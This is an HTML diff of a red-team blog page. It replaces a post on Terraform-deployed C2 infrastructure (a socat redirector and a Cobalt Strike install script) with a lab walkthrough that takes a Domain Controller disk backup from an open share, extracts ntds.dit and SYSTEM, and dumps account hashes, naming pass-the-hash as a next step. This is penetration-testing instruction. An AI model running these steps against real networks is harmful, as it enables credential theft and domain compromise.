@@ -23,7 +23,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.26">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>Automated Red Team Infrastructure Deployment with Terraform - Part 2</title>
+    <title>VHD to DA</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
@@ -31,25 +31,19 @@
     
 
     
-    <meta name="description" content="Introduction
-
-In Part 1, we looked at using Terraform to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.
+    <meta name="description" content="Where a 10-year old backup can fcuk you in the ass&hellip;
 
 ">
-    <meta property="og:description" content="Introduction
-
-In Part 1, we looked at using Terraform to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.
+    <meta property="og:description" content="Where a 10-year old backup can fcuk you in the ass&hellip;
 
 ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="Automated Red Team Infrastructure Deployment with Terraform - Part 2">
-    <meta property="og:url" content="/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/">
+    <meta property="og:title" content="VHD to DA">
+    <meta property="og:url" content="/2018/02/vhd-to-da/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="Introduction
-
-In Part 1, we looked at using Terraform to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.
+    <meta name="twitter:description" content="Where a 10-year old backup can fcuk you in the ass&hellip;
 
 ">
     
@@ -65,7 +59,7 @@ In Part 1, we looked at using Terraform to deploy cloud infrastructure (VMs, fir
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/terraform/icon.png">
+      <meta property="og:image" content="https://rastamouse.me/images/vhd/icon.jpg">
     
     
     
@@ -257,18 +251,18 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Automated Red Team Infrastructure Deployment with Terraform - Part 2
+      VHD to DA
     </h1>
   
   <div class="postShorten-meta post-meta">
   
-    <time itemprop="datePublished" datetime="2017-09-23T00:00:00Z">
+    <time itemprop="datePublished" datetime="2018-02-16T00:00:00Z">
       
   
   
   
   
-    23 September 2017
+    16 February 2018
   
 
     </time>
@@ -289,257 +283,441 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <h2 id="introduction">Introduction</h2>
-
-<p>In <a href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/"><b>Part 1</b></a>, we looked at using <a href="https://www.terraform.io/">Terraform</a> to deploy cloud infrastructure (VMs, firewalls, DNS records etc).  In this post, we&rsquo;ll look at some examples for automating the installation of tools/software on the VM resources.</p>
+              <p>Where a 10-year old backup can fcuk you in the ass&hellip;</p>
 
 <p></p>
 
-<h2 id="provisioners">Provisioners</h2>
+<p>My favourite ways to get DA (or other elevated privilege), is by taking advantage of random stuff just lying around the environment.  I came across a brilliant example of this last week, which involved a VHD backup from a Domain Controller (you can see where this is going).</p>
 
-<p>Terraform has a number of <a href="https://www.terraform.io/docs/provisioners/index.html">provisioners</a> that can be used for this purpose - we&rsquo;ll explore <code>file</code>, <code>local-exec</code>, <code>remote-exec</code> and some of the cool things you can do with them.</p>
+<p>This wasn&rsquo;t a full outside-&gt;in attack; I had access to a legit desktop as a Domain User.</p>
 
-<h3 id="connection">Connection</h3>
+<h2 id="listing-domain-shares">Listing Domain Shares</h2>
 
-<p>Some of the provisioners require remote access to the VM resources, which, for Linux, can be done via SSH.  You will see a <code>connection {}</code> block in some of the examples below.  SSH connections support both <code>password</code> and <code>publickey</code> authentication methods.</p>
+<p>We can start off by dumping all of the domain shares that the current user has read access to.</p>
 
-<h3 id="local-exec">Local Exec</h3>
-
-<p>The <code>local-exec</code> provisioner allow you to run shell commands on your local machine.</p>
-
-<pre><code class="language-text">provisioner &quot;local-exec&quot; {
-    command = &quot;something&quot;
-}
+<pre><code>PS C:\Users\testuser&gt; Find-DomainShare -CheckShareAccess | fl | Out-File domain-shares.txt
 </code></pre>
 
-<h4 id="example">Example</h4>
+<pre><code>PS C:\Users\testuser&gt; gc .\domain-shares.txt
 
-<p>This is quite useful for writing information about your infrastructure to file.  It also has a method for running a different command when an instance is destroyed.</p>
 
-<pre><code class="language-text">resource &quot;digitalocean_droplet&quot; &quot;paydel&quot; {
-    image = &quot;ubuntu-14-04-x64&quot;
-    name = &quot;payload-delivery&quot;
-    region = &quot;lon1&quot;
-    size = &quot;512mb&quot;
-    ssh_keys = [&quot;${digitalocean_ssh_key.rasta.id}&quot;]
+Name         : Backup$
+Type         : 0
+Remark       :
+ComputerName : dc01.testlab.local
 
-    provisioner &quot;local-exec&quot; {
-        command = &quot;echo ${digitalocean_droplet.paydel.ipv4_address}&gt;&gt;paydel-ip.txt&quot;
-    }
+Name         : NETLOGON
+Type         : 0
+Remark       : Logon server share
+ComputerName : dc01.testlab.local
 
-    provisioner &quot;local-exec&quot; {
-        when = &quot;destroy&quot;
-        command = &quot;del paydel-ip.txt&quot;
-    }
-}
+Name         : SYSVOL
+Type         : 0
+Remark       : Logon server share
+ComputerName : dc01.testlab.local
 </code></pre>
 
-<h4 id="verification">Verification</h4>
+<p>We see an interesting hidden share called <code>Backup$</code> on <code>dc01</code>.</p>
 
-<pre><code class="language-text">digitalocean_droplet.paydel: Creation complete (ID: 63586802)
+<h2 id="find-interesting-files">Find Interesting Files</h2>
 
-Apply complete! Resources: 7 added, 0 changed, 0 destroyed.
+<p>Next, list the file content and verify the file permissions.</p>
 
-Outputs:
+<pre><code>PS C:\Users\testuser&gt; ls \\dc01\backup$
 
-paydel-ip = 138.68.180.21
 
-PS C:\Users\Rasta\Desktop\terraform&gt; gc .\paydel-ip.txt
-138.68.180.21
+    Directory: \\dc01\backup$
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       03/02/2018     14:58    10966007808 dc01.testlab.local.vdi
 </code></pre>
 
-<pre><code class="language-text">Destroy complete! Resources: 7 destroyed.
+<pre><code>PS C:\Users\testuser&gt; icacls \\dc01\backup$\dc01.testlab.local.vdi
+\\dc01\backup$\dc01.testlab.local.vdi LAB\Domain Users:(I)(RX,W)
+                                      NT AUTHORITY\SYSTEM:(I)(F)
+                                      BUILTIN\Administrators:(I)(F)
 
-PS C:\Users\Rasta\Desktop\terraform&gt; gc .\paydel-ip.txt
-gc : Cannot find path 'C:\Users\Rasta\Desktop\terraform\paydel-ip.txt' because it does not exist.
+Successfully processed 1 files; Failed processing 0 files
 </code></pre>
 
-<h3 id="remote-exec">Remote Exec</h3>
+<p>These permissions are inherited from the share directory on <code>dc01</code>, and grants all Domain Users read, write and execute rights on <code>dc01.testlab.local.vdi</code>.</p>
 
-<p>The <code>remote-exec</code> provisioner allows you to run shell commands on the VM, but be aware that some environment variables may not be available.</p>
+<h2 id="extract-the-secrets">Extract the Secrets</h2>
 
-<pre><code class="language-text">provisioner &quot;remote-exec&quot; {
-    inline = [
-        &quot;touch /root/test.txt&quot;
-    ]
-}
-</code></pre>
-
-<h4 id="example-1">Example</h4>
-
-<p>The DNS redirector VM was designed to receive incoming DNS requests and redirect them to the DNS C2 server.  To do that, we need to:</p>
+<p>At this point, I think most articles will suggest downloading &amp; mounting the virtual image so you can extract the information you want.  There are two issues with this approach:</p>
 
 <ul>
-<li>Install Socat</li>
-<li>Configure the VM to start socat on boot</li>
-<li>Reboot the VM</li>
+<li>You need local admin on Windows to mount a VHD (which you might not have in the target env).</li>
+<li>VHDs are usually pretty big and a lot of data to move internally, even more so to exfil to a machine you control outside the target env.  Right <a href="https://twitter.com/424f424f">Steve</a> ;)</li>
 </ul>
 
-<pre><code class="language-text">resource &quot;aws_instance&quot; &quot;dns-rdir&quot; {
-    ami = &quot;ami-489f8e2c&quot; # Amazon Linux AMI 2017.03.1
-    instance_type = &quot;t2.micro&quot;
-    key_name = &quot;${aws_key_pair.rasta.key_name}&quot;
-    vpc_security_group_ids = [&quot;${aws_security_group.dns-rdir.id}&quot;]
-    subnet_id = &quot;${aws_subnet.default.id}&quot;
-    associate_public_ip_address = true
+<p>It would be much better imo if we could just extract the two files we need directly.</p>
 
-    provisioner &quot;remote-exec&quot; {
-        inline = [
-            &quot;sudo yum -y update&quot;,
-            &quot;sudo yum -y install socat&quot;,
-            &quot;echo \&quot;socat udp4-listen:53,reuseaddr,fork udp:${digitalocean_droplet.dns-c2.ipv4_address}; echo -ne \\n &amp;\&quot; | sudo tee -a /etc/rc.local&quot;,
-            &quot;sudo reboot&quot;
-        ]
+<h2 id="7-zip">7-Zip</h2>
 
-        connection {
-            type = &quot;ssh&quot;
-            user = &quot;ec2-user&quot;
-            private_key = &quot;${file(&quot;${var.private-key}&quot;)}&quot;
-        }
-    }
-}
+<p>The 7-Zip File Manager is a great option if the circumstances allow.  I was able to drop <code>7zFM.exe</code> and <code>7z.dll</code> to the domain workstation, then extract the exact two files I wanted.</p>
+
+<p><code>\\dc01\backup$\dc01.testlab.local.vdi\1.ntfs\Windows\NTDS\ntds.dit</code>
+<code>\\dc01\backup$\dc01.testlab.local.vdi\1.ntfs\Windows\System32\config\SYSTEM</code></p>
+
+
+<figure >
+    
+        <img src="https://rastamouse.me/images/vhd/7zfm.png" />
+    
+    
+</figure>
+
+
+<p>Better yet, you can extract these directly to your machine (rather than extracting them into the share directory and copying them across separately).</p>
+
+
+<figure >
+    
+        <img src="https://rastamouse.me/images/vhd/extract.png" />
+    
+    
+</figure>
+
+
+<pre><code>PS C:\Users\testuser&gt; ls
+
+
+    Directory: C:\Users\testuser
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---       18/01/2018     20:35                Contacts
+d-r---       17/02/2018     12:34                Desktop
+d-r---       18/01/2018     20:35                Documents
+d-r---       18/01/2018     20:35                Downloads
+d-r---       18/01/2018     20:35                Favorites
+d-r---       18/01/2018     20:35                Links
+d-r---       18/01/2018     20:35                Music
+d-r---       18/01/2018     20:35                OneDrive
+d-r---       18/01/2018     20:35                Pictures
+d-r---       18/01/2018     20:35                Saved Games
+d-r---       18/01/2018     20:35                Searches
+d-r---       18/01/2018     20:35                Videos
+------       04/10/2016     17:06        1609216 7z.dll
+-a----       04/10/2016     15:54         839168 7zFM.exe
+-a----       17/02/2018     11:47           1140 domain-shares.txt
+-a----       26/01/2018     22:01       20971520 ntds.dit
+-a----       26/01/2018     22:01       12582912 SYSTEM
 </code></pre>
 
-<p>Because these are relatively simple tasks - we can just do them on the command line.  The other advantage you can see, is that we don&rsquo;t need to know what the IP address of the DNS C2 server will be up front - we can just reference it through Terraform and it will take care of the rest :)</p>
+<h2 id="dumping-creds">Dumping Creds</h2>
 
-<h4 id="verification-1">Verification</h4>
+<p>I exfiltrated <code>ntds.dit</code> and <code>SYSTEM</code> to my external machine and decided to try the <a href="https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/">DS Internals</a> PowerShell modules.</p>
 
-<pre><code class="language-text">[root@ip-10-0-0-163 ~]# cat /etc/rc.local
-#!/bin/sh
-#
-# This script will be executed *after* all the other init scripts.
-# You can put your own initialization stuff in here if you don't
-# want to do the full Sys V style init stuff.
+<p>Here&rsquo;s an example of its use:</p>
 
-touch /var/lock/subsys/local
-socat udp4-listen:53,reuseaddr,fork udp:178.62.42.201; echo -ne \n &amp;
+<pre><code>PS C:\Users\Rasta\Desktop&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS C:\Users\Rasta\Desktop&gt; Get-ADDBAccount -SamAccountName 'TestUser' -DBPath .\ntds.dit -BootKey $key
+
+DistinguishedName: CN=Test User,CN=Users,DC=testlab,DC=local
+Sid: S-1-5-21-685307900-2367635464-2133520042-1104
+Guid: a7e9722e-c8e6-44d8-9718-5686adc84d5a
+SamAccountName: testuser
+SamAccountType: User
+UserPrincipalName: testuser@testlab.local
+PrimaryGroupId: 513
+SidHistory:
+Enabled: True
+UserAccountControl: NormalAccount, PasswordNeverExpires
+AdminCount: False
+Deleted: False
+LastLogon: 17/02/2018 12:26:07
+DisplayName: Test User
+GivenName: Test
+Surname: User
+Description:
+ServicePrincipalName:
+SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, SelfRelative
+Owner: S-1-5-21-685307900-2367635464-2133520042-512
+Secrets
+  NTHash: fc525c9683e8fe067095ba2ddc971889
+  LMHash:
+  NTHashHistory:
+    Hash 01: fc525c9683e8fe067095ba2ddc971889
+  LMHashHistory:
+    Hash 01: fa305938fd3a4e76a2c7b1bf11a6a18a
+  SupplementalCredentials:
+    ClearText:
+    NTLMStrongHash: dc42f9b4c525a0a145ab8303cdf8ebcf
+    Kerberos:
+      Credentials:
+        DES_CBC_MD5
+          Key: a4b67915c8526476
+      OldCredentials:
+      Salt: TESTLAB.LOCALtestuser
+      Flags: 0
+    KerberosNew:
+      Credentials:
+        AES256_CTS_HMAC_SHA1_96
+          Key: 950e12c1f1b3cf2536834550cb947ed09fc7b6e8a27371cfcadff4dc35b2e200
+          Iterations: 4096
+        AES128_CTS_HMAC_SHA1_96
+          Key: 5ee798833e2dc4aca49ed9a2d816aa60
+          Iterations: 4096
+        DES_CBC_MD5
+          Key: a4b67915c8526476
+          Iterations: 4096
+      OldCredentials:
+      OlderCredentials:
+      ServiceCredentials:
+      Salt: TESTLAB.LOCALtestuser
+      DefaultIterationCount: 4096
+      Flags: 0
+    WDigest:
+      Hash 01: b5062942b81ab51387e6ee5444c75c98
+      Hash 02: 3a3db08999164924e88823d249c8af45
+      Hash 03: 0a0dc041414c282bf989424c5f948d09
+      Hash 04: b5062942b81ab51387e6ee5444c75c98
+      Hash 05: 3a3db08999164924e88823d249c8af45
+      Hash 06: ecc6a9c1815bea8adc69877a6c9be8bb
+      Hash 07: b5062942b81ab51387e6ee5444c75c98
+      Hash 08: ba3981f46d68b04626c18c49664502a3
+      Hash 09: ba3981f46d68b04626c18c49664502a3
+      Hash 10: 9093651592378198707ea0b7b10d63c5
+      Hash 11: 906bcd8e0e795d4e449114652dd8fb94
+      Hash 12: ba3981f46d68b04626c18c49664502a3
+      Hash 13: 044ed781762f98964f5f9fdd6a7a2724
+      Hash 14: 906bcd8e0e795d4e449114652dd8fb94
+      Hash 15: ca5018f3376aeb6c2a313df74dab36d5
+      Hash 16: ca5018f3376aeb6c2a313df74dab36d5
+      Hash 17: 4b96c357eb3bb9c7df7dcf95e67b9f4b
+      Hash 18: 09e178a0ccffd3fca5b4febb8a3880a9
+      Hash 19: 3d00b89bfab11a3257c5297d4d2315d0
+      Hash 20: 0eac68e6c7a9a3781fef5e4ad0593016
+      Hash 21: 79a1f49737bf634b2c6ff6cf33679f0d
+      Hash 22: 79a1f49737bf634b2c6ff6cf33679f0d
+      Hash 23: 024c49ae479c588b20353ccc777e486a
+      Hash 24: fb8170f67f7f5fd79f9d9664819bf4bb
+      Hash 25: fb8170f67f7f5fd79f9d9664819bf4bb
+      Hash 26: ed583eb40396fbfbdb147696fbf2b537
+      Hash 27: 3bd70fb036ef316b21c06ccb229be2cd
+      Hash 28: e03a002b7d9197d33923078317b3e72f
+      Hash 29: 77ac5a611d39db8a0a142e245e43ef16
+Credential Roaming
+  Created:
+  Modified:
+  Credentials:
 </code></pre>
 
-<pre><code class="language-text">[root@ip-10-0-0-163 ~]# ps aux | grep [s]ocat
-root      2527  0.0  0.3  42408  3972 ?        S    Sep23   0:00 socat udp4-listen:53,reuseaddr,fork udp:178.62.42.201
+<p>The <code>UserAccountControl</code> field is great to target accounts that have <code>PasswordNeverExpires</code> set.</p>
+
+<p>You are, of course, free to use NTLM hashes with PTH, PSEXEC etc.  Or you can attempt to crack them for plaintext passwords.</p>
+
+<h2 id="improvements">Improvements?</h2>
+
+<p>The 7-Zip File Manager can only be used with a GUI, so what if we only had a shell?</p>
+
+<p>There is also a command line version of 7z.</p>
+
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Usage: 7z &lt;command&gt; [&lt;switches&gt;...] &lt;archive_name&gt; [&lt;file_names&gt;...]
+       [&lt;@listfiles...&gt;]
+
+&lt;Commands&gt;
+  a : Add files to archive
+  b : Benchmark
+  d : Delete files from archive
+  e : Extract files from archive (without using directory names)
+  h : Calculate hash values for files
+  i : Show information about supported formats
+  l : List contents of archive
+  rn : Rename files in archive
+  t : Test integrity of archive
+  u : Update files to archive
+  x : eXtract files with full paths
 </code></pre>
 
-<h3 id="file">File</h3>
+<p>However, you don&rsquo;t appear to be able to list or extract files in the archive recursively (even though there&rsquo;s an option for it).</p>
 
-<p>The <code>file</code> provisioner is simply used to copy files or directories from your local machine to the VM.</p>
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe l &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot;
 
-<pre><code class="language-text">provisioner &quot;file&quot; {
-    source      = &quot;test.txt&quot;
-    destination = &quot;/root/test.txt&quot;
-}
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 32047628288 bytes (30 GiB)
+
+Listing archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+
+--
+Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+Type = VDI
+Physical Size = 32047628288
+Headers Size = 2097152
+Method = Dynamic
+----
+Size = 107374182400
+Packed Size = 32045531136
+--
+Path = dc01.testlab.local.mbr
+Type = MBR
+Physical Size = 107374182400
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+                    .....    524288000    524288000  0.ntfs
+                    ..... 106847797248 106847797248  1.ntfs
+                    .....      1048576      1048576  2
+------------------- ----- ------------ ------------  ------------------------
+                          107373133824 107373133824  3 files
 </code></pre>
 
-<h4 id="example-2">Example</h4>
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot; -oC:\Users\Rasta\Desktop ntds.dit -r
 
-<p>The HTTP C2 VM was designed to be an HTTP/S Cobalt Strike server.  To do that, we need to:</p>
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
 
-<ul>
-<li>Install Oracle Java</li>
-<li>Install git</li>
-<li>Download &amp; extract Cobalt Strike</li>
-<li>Clone Raphael&rsquo;s Malleable C2 repo</li>
-</ul>
+Scanning the drive for archives:
+1 file, 32047628288 bytes (30 GiB)
 
-<p>This is a little more complicated, so we could write a bash script to do all the work:</p>
+Extracting archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+--
+Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+Type = VDI
+Physical Size = 32047628288
+Headers Size = 2097152
+Method = Dynamic
+----
+Size = 107374182400
+Packed Size = 32045531136
+--
+Path = dc01.testlab.local.mbr
+Type = MBR
+Physical Size = 107374182400
 
-<pre><code class="language-bash">#!/bin/bash
 
-apt -y update
-apt -y install git
+No files to process
+Everything is Ok
 
-mkdir /usr/local/java
-curl -s -j -L -H &quot;Cookie: oraclelicense=accept-securebackup-cookie&quot; http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gz -o /usr/local/java/jdk-8u144-linux-x64.tar.gz
-cd /usr/local/java
-tar zxf jdk-8u144-linux-x64.tar.gz
-echo &quot;JAVA_HOME=/usr/local/java/jdk1.8.0_144&quot; &gt;&gt; /etc/profile
-echo &quot;JRE_HOME=/usr/local/java/jdk1.8.0_144/jre&quot; &gt;&gt; /etc/profile
-echo &quot;PATH=$PATH:/usr/local/java/jdk1.8.0_144/bin:/usr/local/java/jdk1.8.0_144/jre/bin&quot; &gt;&gt; /etc/profile
-echo &quot;export JAVA_HOME&quot; &gt;&gt; /etc/profile
-echo &quot;export JRE_HOME&quot; &gt;&gt; /etc/profile
-echo &quot;export PATH&quot; &gt;&gt; /etc/profile
-update-alternatives --install &quot;/usr/bin/java&quot; &quot;java&quot; &quot;/usr/local/java/jdk1.8.0_144/bin/java&quot; 1
-update-alternatives --install &quot;/usr/bin/javaws&quot; &quot;javaws&quot; &quot;/usr/local/java/jdk1.8.0_144/bin/javaws&quot; 1
-update-alternatives --set java /usr/local/java/jdk1.8.0_144/bin/java
-update-alternatives --set javaws /usr/local/java/jdk1.8.0_144/bin/javaws
-rm /usr/local/java/jdk-8u144-linux-x64.tar.gz
-
-key='xxxx-xxxx-xxxx-xxxx'
-token=`curl -s https://www.cobaltstrike.com/download -d &quot;dlkey=${key}&quot; | grep 'href=&quot;/downloads/' | cut -d '/' -f3`
-curl -s https://www.cobaltstrike.com/downloads/${token}/cobaltstrike-trial.tgz -o /tmp/cobaltstrike.tgz
-mkdir /opt/cobaltstrike
-tar zxf /tmp/cobaltstrike.tgz -C /opt
-echo ${key} &gt; /root/.cobaltstrike.license
-rm /tmp/cobaltstrike.tgz
-
-git clone https://github.com/rsmudge/Malleable-C2-Profiles.git /opt/cobaltstrike/c2
+Files: 0
+Size:       0
+Compressed: 32047628288
 </code></pre>
 
-<p>We can then combine provisioners, i.e. use <code>file</code> to upload the script and <code>remote-exec</code> to execute it.  They are executed in the order placed (from top to bottom).</p>
+<p>If anybody knows how to actually do this, I&rsquo;d love to hear from you!</p>
 
-<pre><code class="language-text">resource &quot;digitalocean_droplet&quot; &quot;http-c2&quot; {
-    image = &quot;ubuntu-14-04-x64&quot;
-    name = &quot;http-c2&quot;
-    region = &quot;lon1&quot;
-    size = &quot;2gb&quot;
-    ssh_keys = [&quot;${digitalocean_ssh_key.rasta.id}&quot;]
+<p>The lame way, is to extract <code>1.ntfs</code> first.</p>
 
-    provisioner &quot;file&quot; {
-        source = &quot;scripts\\install-c2.txt&quot;
-        destination = &quot;/tmp/install-c2.sh&quot;
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e &quot;E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi&quot; -oC:\Users\Rasta\Desktop 1.ntfs
 
-        connection {
-            type = &quot;ssh&quot;
-            user = &quot;ec2-user&quot;
-            private_key = &quot;${file(&quot;${var.private-key}&quot;)}&quot;
-        }
-    }
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
 
-    provisioner &quot;remote-exec&quot; {
-        inline = [
-            &quot;chmod +x /tmp/install-c2.sh&quot;,
-            &quot;/tmp/install-c2.sh&quot;,
-            &quot;rm -rf /tmp/*&quot;
-        ]
+Scanning the drive for archives:
+1 file, 32047628288 bytes (30 GiB)
 
-        connection {
-            type = &quot;ssh&quot;
-            user = &quot;ec2-user&quot;
-            private_key = &quot;${file(&quot;${var.private-key}&quot;)}&quot;
-        }
-    }
-}
+Extracting archive: E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+--
+Path = E:\VirtualBox VMs\testlab.local\dc01.testlab.local\dc01.testlab.local.vdi
+Type = VDI
+Physical Size = 32047628288
+Headers Size = 2097152
+Method = Dynamic
+----
+Size = 107374182400
+Packed Size = 32045531136
+--
+Path = dc01.testlab.local.mbr
+Type = MBR
+Physical Size = 107374182400
+
+Everything is Ok
+
+Size:       106847797248
+Compressed: 32047628288
 </code></pre>
 
-<h4 id="verification-2">Verification</h4>
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe l ..\1.ntfs | more
 
-<pre><code class="language-text">root@http-c2:~# java -version
-java version &quot;1.8.0_144&quot;
-Java(TM) SE Runtime Environment (build 1.8.0_144-b01)
-Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode)
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 106847797248 bytes (100 GiB)
+
+Listing archive: ..\1.ntfs
+
+--
+Path = ..\1.ntfs
+Type = NTFS
+Physical Size = 106847797248
+File System = NTFS 3.1
+Cluster Size = 4096
+Sector Size = 512
+Record Size = 1024
+Created = 2018-01-15 04:09:04
+ID = 5766460664093954998
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2018-01-15 04:09:04 ..HS.    110362624    110362624  [SYSTEM]\$MFT
+2018-01-15 04:09:04 ..HS.         4096         4096  [SYSTEM]\$MFTMirr
+2018-01-15 04:09:04 ..HS.     67108864     67108864  [SYSTEM]\$LogFile
+2018-01-15 04:09:04 ..HS.            0            0  [SYSTEM]\$Volume
+2018-01-15 04:09:04 ..HS.         2560         4096  [SYSTEM]\$AttrDef
+2018-02-15 20:13:10 D.HS.                            [SYSTEM]\.
+2018-01-15 04:09:04 ..HS.      3260736      3264512  [SYSTEM]\$Bitmap
+2018-01-15 04:09:04 ..HS.         8192         8192  [SYSTEM]\$Boot
+-- More  --
 </code></pre>
 
-<pre><code class="language-text">root@http-c2:~# ll /opt/cobaltstrike/
-total 21748
-drwxr-xr-x 4  501 dialout     4096 Sep 24 10:22 ./
-drwxr-xr-x 3 root root        4096 Sep 24 10:22 ../
--rwxr-xr-x 1  501 dialout      126 Sep 21 02:49 agscript*
-drwxr-xr-x 6 root root        4096 Sep 24 10:22 c2/
--rwxr-xr-x 1  501 dialout      144 Sep 21 02:49 c2lint*
--rwxr-xr-x 1  501 dialout       93 Sep 21 02:49 cobaltstrike*
--rw-r--r-- 1  501 dialout 21638284 Sep 21 02:49 cobaltstrike.jar
--rw-r--r-- 1  501 dialout    96104 Sep 21 02:49 icon.jpg
--rw-r--r-- 1  501 dialout    87101 Sep 21 02:49 license.pdf
--rw-r--r-- 1  501 dialout    25388 Sep 21 02:49 readme.txt
--rw-r--r-- 1  501 dialout   103682 Sep 21 02:49 releasenotes.txt
--rwxr-xr-x 1  501 dialout     1865 Sep 21 02:49 teamserver*
-drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
--rwxr-xr-x 1  501 dialout       87 Sep 21 02:49 update*
--rw-r--r-- 1  501 dialout   266484 Sep 21 02:49 update.jar
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e ..\1.ntfs -oC:\Users\Rasta\Desktop Windows\NTDS\ntds.dit
+
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 106847797248 bytes (100 GiB)
+
+Extracting archive: ..\1.ntfs
+--
+Path = ..\1.ntfs
+Type = NTFS
+Physical Size = 106847797248
+File System = NTFS 3.1
+Cluster Size = 4096
+Sector Size = 512
+Record Size = 1024
+Created = 2018-01-15 04:09:04
+ID = 5766460664093954998
+
+Everything is Ok
+
+Size:       20971520
+Compressed: 106847797248
 </code></pre>
 
-<h2 id="closing">Closing</h2>
+<pre><code>C:\Users\Rasta\Desktop\7-Zip&gt;7z.exe e ..\1.ntfs -oC:\Users\Rasta\Desktop Windows\System32\config\SYSTEM
 
-<p>These were just 3 examples of ways to use Terraform Provisioners to execute post-build tasks - hopefully they will give you ideas about how you can automate your own complete builds.</p>
+7-Zip [64] 16.04 : Copyright (c) 1999-2016 Igor Pavlov : 2016-10-04
+
+Scanning the drive for archives:
+1 file, 106847797248 bytes (100 GiB)
+
+Extracting archive: ..\1.ntfs
+--
+Path = ..\1.ntfs
+Type = NTFS
+Physical Size = 106847797248
+File System = NTFS 3.1
+Cluster Size = 4096
+Sector Size = 512
+Record Size = 1024
+Created = 2018-01-15 04:09:04
+ID = 5766460664093954998
+
+Everything is Ok
+
+Size:       12582912
+Compressed: 106847797248
+</code></pre>
               
             </div>
           </div>
@@ -553,10 +731,6 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
                     
   <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/red-team/">red team</a>
 
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/infrastructure/">infrastructure</a>
-
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/terraform/">terraform</a>
-
                   </div>
                 
               
@@ -567,7 +741,7 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/02/vhd-to-da/" data-tooltip="VHD to DA">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -575,7 +749,7 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/" data-tooltip="Jumping Network Segregation with RDP">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/" data-tooltip="Automated Red Team Infrastructure Deployment with Terraform - Part 2">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -592,17 +766,17 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
         </a>
       </li>
       <li class="post-action hide-xs">
